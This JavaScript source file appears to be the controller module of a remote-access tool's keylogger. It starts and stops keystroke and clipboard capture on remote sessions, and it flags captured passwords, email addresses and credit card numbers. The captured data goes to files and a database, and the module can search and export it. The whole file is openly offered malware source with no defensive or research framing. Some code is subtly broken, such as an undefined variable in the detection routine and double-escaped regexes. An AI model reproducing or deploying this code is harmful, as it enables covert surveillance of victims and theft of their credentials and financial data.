/**
 * Keylogger Module - Complete Keystroke Logging System
 * Features: Real-time Keylogging, Password Capture, Clipboard Monitoring, Application Tracking
 */

const EventEmitter = require('events');
const fs = require('fs-extra');
const path = require('path');
const crypto = require('crypto');
const moment = require('moment');
const config = require('../config');

class KeyloggerModule extends EventEmitter {
    constructor(sessionManager) {
        super();
        this.sessionManager = sessionManager;
        this.activeSessions = new Map(); // sessionId -> keylogger state
        this.logBuffers = new Map(); // sessionId -> log buffer
        this.passwordPatterns = new Map(); // sessionId -> detected passwords
        this.applicationLogs = new Map(); // sessionId -> app-specific logs
        
        // Password detection patterns
        this.passwordPatternsList = [
            /password/i, /passwd/i, /pwd/i, /login/i, /signin/i,
            /username/i, /user/i, /email/i, /account/i,
            /credit.?card/i, /cvv/i, /expiry/i,
            /ssn/i, /social.?security/i,
            /bank/i, /routing/i, /account.?number/i,
            /pin/i, /code/i, /token/i,
            /auth/i, /authenticate/i,
            /secret/i, /private/i,
            /key/i, /api.?key/i, /secret.?key/i
        ];
        
        // Credit card regex patterns
        this.creditCardPatterns = [
            /\\b\\d{4}[\\s-]?\\d{4}[\\s-]?\\d{4}[\\s-]?\\d{4}\\b/, // 16 digits
            /\\b\\d{4}[\\s-]?\\d{6}[\\s-]?\\d{5}\\b/, // American Express
            /\\b\\d{15,16}\\b/ // Any 15-16 digit number
        ];
        
        // Email regex
        this.emailPattern = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}/;
        
        // Initialize directories
        this.initDirectories();
        
        // Start flush interval
        this.startFlushInterval();
        
        // Start cleanup interval
        this.startCleanupInterval();
    }
    
    initDirectories() {
        this.logsDir = path.join(__dirname, '../../keylogs');
        this.passwordsDir = path.join(this.logsDir, 'passwords');
        this.appsDir = path.join(this.logsDir, 'applications');
        fs.ensureDirSync(this.logsDir);
        fs.ensureDirSync(this.passwordsDir);
        fs.ensureDirSync(this.appsDir);
    }
    
    // ==================== KEYLOGGER CONTROL ====================
    
    async startKeylogger(sessionId, options = {}) {
        const session = this.sessionManager.getSession(sessionId);
        if (!session) {
            throw new Error('Session not found');
        }
        
        if (this.activeSessions.has(sessionId)) {
            throw new Error('Keylogger already active');
        }
        
        const keyloggerId = crypto.randomBytes(8).toString('hex');
        const startTime = Date.now();
        
        const keyloggerState = {
            id: keyloggerId,
            sessionId: sessionId,
            startTime: startTime,
            options: {
                capturePasswords: options.capturePasswords !== false,
                captureClipboard: options.captureClipboard !== false,
                captureScreenshots: options.captureScreenshots || false,
                minLength: options.minLength || 3,
                flushInterval: options.flushInterval || 10000,
                ...options
            },
            status: 'active',
            stats: {
                totalKeys: 0,
                totalCharacters: 0,
                passwordsFound: 0,
                creditCardsFound: 0,
                emailsFound: 0,
                activeApplications: new Set(),
                logsFlushed: 0
            }
        };
        
        try {
            // Send start keylogger command
            await this.sessionManager.executeCommand(sessionId, 'start_keylogger', keyloggerState.options, 10000);
            
            this.activeSessions.set(sessionId, keyloggerState);
            this.logBuffers.set(sessionId, []);
            this.applicationLogs.set(sessionId, new Map());
            
            this.emit('keylogger_started', sessionId, keyloggerState);
            
            return keyloggerState;
            
        } catch (error) {
            console.error(`Failed to start keylogger for session ${sessionId}:`, error);
            throw error;
        }
    }
    
    async stopKeylogger(sessionId) {
        const keyloggerState = this.activeSessions.get(sessionId);
        if (!keyloggerState) {
            throw new Error('Keylogger not active');
        }
        
        try {
            await this.sessionManager.executeCommand(sessionId, 'stop_keylogger', {}, 10000);
            
            // Flush remaining logs
            await this.flushLogs(sessionId);
            
            keyloggerState.status = 'stopped';
            keyloggerState.endTime = Date.now();
            keyloggerState.duration = (keyloggerState.endTime - keyloggerState.startTime) / 1000;
            
            // Save final stats
            await this.saveKeyloggerStats(sessionId, keyloggerState);
            
            this.emit('keylogger_stopped', sessionId, keyloggerState);
            
            return keyloggerState;
            
        } catch (error) {
            console.error(`Failed to stop keylogger for session ${sessionId}:`, error);
            throw error;
            
        } finally {
            this.activeSessions.delete(sessionId);
            this.logBuffers.delete(sessionId);
        }
    }
    
    // ==================== KEYLOG PROCESSING ====================
    
    async addKeylog(sessionId, logData) {
        const keyloggerState = this.activeSessions.get(sessionId);
        if (!keyloggerState || keyloggerState.status !== 'active') {
            return;
        }
        
        const keylog = {
            id: crypto.randomBytes(8).toString('hex'),
            sessionId: sessionId,
            timestamp: Date.now(),
            data: logData.text || '',
            application: logData.application || 'unknown',
            windowTitle: logData.windowTitle || '',
            isSensitive: false,
            detectedPassword: null,
            detectedEmail: null,
            detectedCreditCard: null
        };
        
        // Update statistics
        keyloggerState.stats.totalKeys++;
        keyloggerState.stats.totalCharacters += keylog.data.length;
        keyloggerState.stats.activeApplications.add(keylog.application);
        
        // Detect sensitive information
        if (keyloggerState.options.capturePasswords) {
            this.detectSensitiveData(keylog);
        }
        
        // Add to buffer
        const buffer = this.logBuffers.get(sessionId);
        if (buffer) {
            buffer.push(keylog);
            
            // Auto-flush if buffer is full
            if (buffer.length >= 100) {
                await this.flushLogs(sessionId);
            }
        }
        
        // Add to application logs
        const appLogs = this.applicationLogs.get(sessionId);
        if (appLogs) {
            if (!appLogs.has(keylog.application)) {
                appLogs.set(keylog.application, []);
            }
            appLogs.get(keylog.application).push(keylog);
        }
        
        this.emit('keylog_received', sessionId, keylog);
        
        return keylog;
    }
    
    detectSensitiveData(keylog) {
        const text = keylog.data;
        
        // Check for passwords (usually after specific keywords)
        for (const pattern of this.passwordPatternsList) {
            if (pattern.test(text)) {
                // Look for the password in the next keystrokes (simplified)
                keylog.isSensitive = true;
                keylog.detectedPassword = text;
                keyloggerState.stats.passwordsFound++;
                this.emit('password_detected', keylog.sessionId, { 
                    application: keylog.application,
                    password: text,
                    timestamp: keylog.timestamp
                });
                break;
            }
        }
        
        // Check for email addresses
        if (this.emailPattern.test(text)) {
            keylog.detectedEmail = text.match(this.emailPattern)[0];
            keyloggerState.stats.emailsFound++;
            this.emit('email_detected', keylog.sessionId, {
                application: keylog.application,
                email: keylog.detectedEmail,
                timestamp: keylog.timestamp
            });
        }
        
        // Check for credit cards
        for (const pattern of this.creditCardPatterns) {
            if (pattern.test(text)) {
                keylog.detectedCreditCard = text.match(pattern)[0];
                keyloggerState.stats.creditCardsFound++;
                this.emit('credit_card_detected', keylog.sessionId, {
                    application: keylog.application,
                    card: keylog.detectedCreditCard,
                    timestamp: keylog.timestamp
                });
                break;
            }
        }
    }
    
    // ==================== LOG MANAGEMENT ====================
    
    async flushLogs(sessionId) {
        const buffer = this.logBuffers.get(sessionId);
        if (!buffer || buffer.length === 0) {
            return;
        }
        
        const keyloggerState = this.activeSessions.get(sessionId);
        if (!keyloggerState) {
            return;
        }
        
        const logsToSave = [...buffer];
        buffer.length = 0;
        
        // Save to file
        const filename = `keylog_${sessionId}_${Date.now()}.json`;
        const filePath = path.join(this.logsDir, filename);
        
        const data = {
            sessionId: sessionId,
            keyloggerId: keyloggerState.id,
            startTime: keyloggerState.startTime,
            timestamp: Date.now(),
            count: logsToSave.length,
            logs: logsToSave.map(log => ({
                timestamp: log.timestamp,
                data: log.data,
                application: log.application,
                windowTitle: log.windowTitle,
                isSensitive: log.isSensitive,
                detectedPassword: log.detectedPassword,
                detectedEmail: log.detectedEmail,
                detectedCreditCard: log.detectedCreditCard
            }))
        };
        
        await fs.writeJson(filePath, data, { spaces: 2 });
        
        keyloggerState.stats.logsFlushed++;
        
        this.emit('logs_flushed', sessionId, logsToSave.length);
        
        // Save to database
        const database = require('../database');
        for (const log of logsToSave) {
            await database.addKeylog(
                sessionId,
                log.data,
                log.application,
                log.windowTitle,
                null,
                log.isSensitive
            );
        }
    }
    
    async getLogs(sessionId, limit = 100, startDate = null, endDate = null) {
        const buffer = this.logBuffers.get(sessionId) || [];
        
        let logs = [...buffer];
        
        // Try to load from files
        const files = await fs.readdir(this.logsDir);
        const sessionFiles = files.filter(f => f.startsWith(`keylog_${sessionId}`));
        
        for (const file of sessionFiles) {
            const filePath = path.join(this.logsDir, file);
            const data = await fs.readJson(filePath);
            logs = [...logs, ...data.logs];
        }
        
        // Sort by timestamp
        logs.sort((a, b) => b.timestamp - a.timestamp);
        
        // Filter by date range
        if (startDate) {
            logs = logs.filter(l => l.timestamp >= startDate);
        }
        if (endDate) {
            logs = logs.filter(l => l.timestamp <= endDate);
        }
        
        return logs.slice(0, limit);
    }
    
    async getApplicationLogs(sessionId, application, limit = 100) {
        const appLogs = this.applicationLogs.get(sessionId);
        if (!appLogs) {
            return [];
        }
        
        const logs = appLogs.get(application) || [];
        return logs.slice(0, limit);
    }
    
    async getDetectedPasswords(sessionId, limit = 100) {
        const logs = await this.getLogs(sessionId, 10000);
        return logs
            .filter(l => l.detectedPassword)
            .slice(0, limit)
            .map(l => ({
                password: l.detectedPassword,
                application: l.application,
                timestamp: l.timestamp,
                windowTitle: l.windowTitle
            }));
    }
    
    async getDetectedEmails(sessionId, limit = 100) {
        const logs = await this.getLogs(sessionId, 10000);
        return logs
            .filter(l => l.detectedEmail)
            .slice(0, limit)
            .map(l => ({
                email: l.detectedEmail,
                application: l.application,
                timestamp: l.timestamp
            }));
    }
    
    async getDetectedCreditCards(sessionId, limit = 100) {
        const logs = await this.getLogs(sessionId, 10000);
        return logs
            .filter(l => l.detectedCreditCard)
            .slice(0, limit)
            .map(l => ({
                card: l.detectedCreditCard,
                application: l.application,
                timestamp: l.timestamp
            }));
    }
    
    // ==================== CLIPBOARD MONITORING ====================
    
    async startClipboardMonitoring(sessionId) {
        const session = this.sessionManager.getSession(sessionId);
        if (!session) {
            throw new Error('Session not found');
        }
        
        await this.sessionManager.executeCommand(sessionId, 'start_clipboard_monitoring', {}, 10000);
        
        this.emit('clipboard_monitoring_started', sessionId);
        
        return true;
    }
    
    async stopClipboardMonitoring(sessionId) {
        await this.sessionManager.executeCommand(sessionId, 'stop_clipboard_monitoring', {}, 10000);
        
        this.emit('clipboard_monitoring_stopped', sessionId);
        
        return true;
    }
    
    async addClipboardData(sessionId, data) {
        const clipboardData = {
            id: crypto.randomBytes(8).toString('hex'),
            sessionId: sessionId,
            timestamp: Date.now(),
            content: data.content || '',
            source: data.source || 'unknown',
            type: data.type || 'text'
        };
        
        // Check for sensitive data in clipboard
        if (this.emailPattern.test(clipboardData.content)) {
            this.emit('clipboard_email_detected', sessionId, {
                email: clipboardData.content.match(this.emailPattern)[0],
                timestamp: clipboardData.timestamp
            });
        }
        
        for (const pattern of this.creditCardPatterns) {
            if (pattern.test(clipboardData.content)) {
                this.emit('clipboard_card_detected', sessionId, {
                    card: clipboardData.content.match(pattern)[0],
                    timestamp: clipboardData.timestamp
                });
            }
        }
        
        // Save to database
        const database = require('../database');
        await database.addClipboardData(sessionId, clipboardData.content, clipboardData.type, clipboardData.source);
        
        this.emit('clipboard_data_received', sessionId, clipboardData);
        
        return clipboardData;
    }
    
    // ==================== STATISTICS ====================
    
    async getKeyloggerStats(sessionId) {
        const keyloggerState = this.activeSessions.get(sessionId);
        
        if (keyloggerState && keyloggerState.status === 'active') {
            return {
                status: 'active',
                startTime: keyloggerState.startTime,
                duration: (Date.now() - keyloggerState.startTime) / 1000,
                totalKeys: keyloggerState.stats.totalKeys,
                totalCharacters: keyloggerState.stats.totalCharacters,
                activeApplications: Array.from(keyloggerState.stats.activeApplications),
                passwordsFound: keyloggerState.stats.passwordsFound,
                emailsFound: keyloggerState.stats.emailsFound,
                creditCardsFound: keyloggerState.stats.creditCardsFound,
                logsFlushed: keyloggerState.stats.logsFlushed
            };
        }
        
        // Load from saved stats
        const statsFile = path.join(this.logsDir, `stats_${sessionId}.json`);
        if (await fs.pathExists(statsFile)) {
            return await fs.readJson(statsFile);
        }
        
        return null;
    }
    
    async saveKeyloggerStats(sessionId, keyloggerState) {
        const statsFile = path.join(this.logsDir, `stats_${sessionId}.json`);
        
        const stats = {
            sessionId: sessionId,
            keyloggerId: keyloggerState.id,
            startTime: keyloggerState.startTime,
            endTime: keyloggerState.endTime,
            duration: keyloggerState.duration,
            totalKeys: keyloggerState.stats.totalKeys,
            totalCharacters: keyloggerState.stats.totalCharacters,
            activeApplications: Array.from(keyloggerState.stats.activeApplications),
            passwordsFound: keyloggerState.stats.passwordsFound,
            emailsFound: keyloggerState.stats.emailsFound,
            creditCardsFound: keyloggerState.stats.creditCardsFound,
            logsFlushed: keyloggerState.stats.logsFlushed
        };
        
        await fs.writeJson(statsFile, stats, { spaces: 2 });
    }
    
    // ==================== SEARCH ====================
    
    async searchKeylogs(sessionId, query, limit = 100) {
        const logs = await this.getLogs(sessionId, 10000);
        
        const results = logs.filter(log => 
            log.data.toLowerCase().includes(query.toLowerCase()) ||
            (log.application && log.application.toLowerCase().includes(query.toLowerCase())) ||
            (log.windowTitle && log.windowTitle.toLowerCase().includes(query.toLowerCase()))
        );
        
        return results.slice(0, limit);
    }
    
    async searchPasswords(sessionId, query, limit = 100) {
        const passwords = await this.getDetectedPasswords(sessionId, 1000);
        
        return passwords.filter(p => 
            p.password.toLowerCase().includes(query.toLowerCase()) ||
            p.application.toLowerCase().includes(query.toLowerCase())
        ).slice(0, limit);
    }
    
    // ==================== EXPORT ====================
    
    async exportKeylogs(sessionId, format = 'json') {
        const logs = await this.getLogs(sessionId, 100000);
        
        if (format === 'txt') {
            let output = `Keylog Export - Session ${sessionId}\n`;
            output += `Exported: ${new Date().toISOString()}\n`;
            output += `Total Logs: ${logs.length}\n`;
            output += `=${'='.repeat(50)}\n\n`;
            
            for (const log of logs) {
                output += `[${new Date(log.timestamp).toISOString()}] `;
                output += `${log.application} - ${log.windowTitle}\n`;
                output += `${log.data}\n\n`;
            }
            
            const filePath = path.join(this.logsDir, `export_${sessionId}_${Date.now()}.txt`);
            await fs.writeFile(filePath, output);
            return filePath;
            
        } else {
            const filePath = path.join(this.logsDir, `export_${sessionId}_${Date.now()}.json`);
            await fs.writeJson(filePath, { sessionId, exportedAt: Date.now(), logs }, { spaces: 2 });
            return filePath;
        }
    }
    
    // ==================== CLEAR LOGS ====================
    
    async clearLogs(sessionId) {
        // Clear memory buffer
        const buffer = this.logBuffers.get(sessionId);
        if (buffer) {
            buffer.length = 0;
        }
        
        // Clear application logs
        const appLogs = this.applicationLogs.get(sessionId);
        if (appLogs) {
            appLogs.clear();
        }
        
        // Delete files
        const files = await fs.readdir(this.logsDir);
        const sessionFiles = files.filter(f => f.startsWith(`keylog_${sessionId}`) || f.startsWith(`stats_${sessionId}`));
        
        for (const file of sessionFiles) {
            await fs.remove(path.join(this.logsDir, file));
        }
        
        this.emit('logs_cleared', sessionId);
        
        return true;
    }
    
    // ==================== INTERVALS ====================
    
    startFlushInterval() {
        setInterval(async () => {
            for (const [sessionId, buffer] of this.logBuffers) {
                if (buffer && buffer.length > 0) {
                    await this.flushLogs(sessionId);
                }
            }
        }, 10000); // Flush every 10 seconds
    }
    
    startCleanupInterval() {
        setInterval(async () => {
            await this.cleanup();
        }, 24 * 60 * 60 * 1000); // Every 24 hours
    }
    
    async cleanup() {
        const now = Date.now();
        const maxAge = 30 * 24 * 60 * 60 * 1000; // 30 days
        
        const files = await fs.readdir(this.logsDir);
        for (const file of files) {
            const filePath = path.join(this.logsDir, file);
            const stats = await fs.stat(filePath);
            if (now - stats.mtimeMs > maxAge) {
                await fs.remove(filePath);
            }
        }
        
        this.emit('cleanup_completed');
    }
    
    // ==================== EVENT HANDLERS ====================
    
    onKeyloggerStarted(callback) {
        this.on('keylogger_started', callback);
    }
    
    onKeyloggerStopped(callback) {
        this.on('keylogger_stopped', callback);
    }
    
    onKeylogReceived(callback) {
        this.on('keylog_received', callback);
    }
    
    onPasswordDetected(callback) {
        this.on('password_detected', callback);
    }
    
    onEmailDetected(callback) {
        this.on('email_detected', callback);
    }
    
    onCreditCardDetected(callback) {
        this.on('credit_card_detected', callback);
    }
    
    onLogsFlushed(callback) {
        this.on('logs_flushed', callback);
    }
    
    onLogsCleared(callback) {
        this.on('logs_cleared', callback);
    }
    
    onClipboardDataReceived(callback) {
        this.on('clipboard_data_received', callback);
    }
}

module.exports = KeyloggerModule;
